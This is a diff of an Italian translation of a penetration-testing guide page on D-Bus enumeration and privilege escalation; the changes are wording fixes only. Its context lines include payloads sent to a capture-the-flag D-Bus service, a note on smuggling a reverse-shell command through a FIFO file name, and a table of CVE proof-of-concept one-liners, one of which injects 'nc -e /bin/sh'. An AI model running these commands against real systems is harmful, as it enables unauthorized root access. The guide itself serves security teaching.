@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## **Enumerazione GUI**
+## **GUI enumeration**
 
 D-Bus è utilizzato come mediatore per le comunicazioni inter-processo (IPC) negli ambienti desktop di Ubuntu. Su Ubuntu, si osserva il funzionamento simultaneo di diversi bus di messaggi: il bus di sistema, principalmente utilizzato da **servizi privilegiati per esporre servizi rilevanti per l'intero sistema**, e un bus di sessione per ogni utente connesso, che espone servizi rilevanti solo per quell'utente specifico. L'attenzione qui è principalmente sul bus di sistema a causa della sua associazione con servizi che operano con privilegi più elevati (ad esempio, root) poiché il nostro obiettivo è elevare i privilegi. Si nota che l'architettura di D-Bus impiega un 'router' per ogni bus di sessione, responsabile della reindirizzazione dei messaggi dei client ai servizi appropriati in base all'indirizzo specificato dai client per il servizio con cui desiderano comunicare.
 
@@ -167,7 +167,7 @@ sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-Nell'esempio seguente, l'interfaccia `htb.oouch.Block` è monitorata e **il messaggio "**_**lalalalal**_**" viene inviato attraverso una cattiva comunicazione**:
+Nell'esempio seguente, l'interfaccia `htb.oouch.Block` è monitorata e **il messaggio "**_**lalalalal**_**" viene inviato attraverso una comunicazione errata**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -194,7 +194,7 @@ Se ci sono troppe informazioni sul bus, passa una regola di corrispondenza in qu
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Possono essere specificate più regole. Se un messaggio corrisponde a _qualunque_ delle regole, il messaggio verrà stampato. Così:
+È possibile specificare più regole. Se un messaggio corrisponde a _qualunque_ delle regole, il messaggio verrà stampato. Così:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -204,7 +204,7 @@ dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
 Consulta la [documentazione di D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) per ulteriori informazioni sulla sintassi delle regole di corrispondenza.
 
-### Di più
+### Maggiori informazioni
 
 `busctl` ha ancora più opzioni, [**trovale tutte qui**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
@@ -262,13 +262,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Inoltre, nella riga 57 puoi trovare che **l'unico metodo registrato** per questa comunicazione D-Bus si chiama `Block`(_**Ecco perché nella sezione seguente i payload verranno inviati all'oggetto di servizio `htb.oouch.Block`, all'interfaccia `/htb/oouch/Block` e al nome del metodo `Block`**_):
+Inoltre, nella riga 57 puoi trovare che **l'unico metodo registrato** per questa comunicazione D-Bus si chiama `Block`(_**Ecco perché nella sezione seguente i payload verranno inviati all'oggetto servizio `htb.oouch.Block`, all'interfaccia `/htb/oouch/Block` e al nome del metodo `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Il seguente codice python invierà il payload alla connessione D-Bus al metodo `Block` tramite `block_iface.Block(runme)` (_nota che è stato estratto dal precedente blocco di codice_):
+Il seguente codice python invierà il payload alla connessione D-Bus al metodo `Block` tramite `block_iface.Block(runme)` (_nota che è stato estratto dal blocco di codice precedente_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -284,8 +284,8 @@ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oou
 ```
 - `dbus-send` è uno strumento utilizzato per inviare messaggi al “Message Bus”
 - Message Bus – Un software utilizzato dai sistemi per facilitare le comunicazioni tra le applicazioni. È correlato a Message Queue (i messaggi sono ordinati in sequenza) ma nel Message Bus i messaggi vengono inviati in un modello di abbonamento e sono anche molto veloci.
-- Il tag “-system” è utilizzato per indicare che si tratta di un messaggio di sistema, non di un messaggio di sessione (per impostazione predefinita).
-- Il tag “–print-reply” è utilizzato per stampare il nostro messaggio in modo appropriato e ricevere eventuali risposte in un formato leggibile dall'uomo.
+- Il tag “-system” viene utilizzato per indicare che si tratta di un messaggio di sistema, non di un messaggio di sessione (per impostazione predefinita).
+- Il tag “–print-reply” viene utilizzato per stampare il nostro messaggio in modo appropriato e ricevere eventuali risposte in un formato leggibile dall'uomo.
 - “–dest=Dbus-Interface-Block” L'indirizzo dell'interfaccia Dbus.
 - “–string:” – Tipo di messaggio che desideriamo inviare all'interfaccia. Ci sono diversi formati per inviare messaggi come double, bytes, booleans, int, objpath. Tra questi, il “object path” è utile quando vogliamo inviare un percorso di un file all'interfaccia Dbus. Possiamo utilizzare un file speciale (FIFO) in questo caso per passare un comando all'interfaccia nel nome di un file. “string:;” – Questo serve a richiamare nuovamente il percorso dell'oggetto dove posizioniamo il file/comando della shell inversa FIFO.
 
@@ -451,7 +451,7 @@ sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
 
 ### uptux.py
 * Autore: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
-* Script solo Python che cerca percorsi *scrivibili* nelle unità systemd **e** file di policy D-Bus eccessivamente permissivi (ad es. `send_destination="*"`).
+* Script solo Python che cerca percorsi *scrivibili* nelle unità systemd **e** file di policy D-Bus eccessivamente permissivi (es. `send_destination="*"`).
 * Uso rapido:
 ```bash
 python3 uptux.py -n          # esegui tutti i controlli ma non scrivere un file di log
@@ -467,10 +467,10 @@ python3 uptux.py -d          # abilita l'output di debug verboso
 
 Tenere d'occhio le CVE pubblicate di recente aiuta a individuare schemi insicuri simili nel codice personalizzato. I seguenti problemi EoP locali ad alto impatto derivano tutti dalla mancanza di autenticazione/autorizzazione sul **bus di sistema**:
 
-| Anno | CVE | Componente | Causa Radice | One-Liner PoC |
+| Anno | CVE | Componente | Causa Radice | PoC in una riga |
 |------|-----|-----------|------------|---------------|
 | 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (daemon HID Logitech) | Il servizio di sistema `logid` espone un'interfaccia `org.freedesktop.Logiopsd` senza restrizioni che consente a *qualsiasi* utente di cambiare i profili dei dispositivi e iniettare comandi shell arbitrari tramite stringhe macro. | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
-| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | Un proxy in esecuzione come root inoltra nomi di bus legacy ai servizi backend **senza inoltrare UID/contesto Polkit del chiamante**, quindi ogni richiesta inoltrata è trattata come UID 0. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | Un proxy in esecuzione come root inoltra nomi di bus legacy ai servizi backend **senza inoltrare il contesto UID/Polkit del chiamante**, quindi ogni richiesta inoltrata è trattata come UID 0. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
 | 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | Il metodo pubblico `Dispatch` manca di ACL → l'attaccante può ordinare al lavoratore del *package-manager* di installare RPM arbitrari. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |
 
 Schemi da notare:
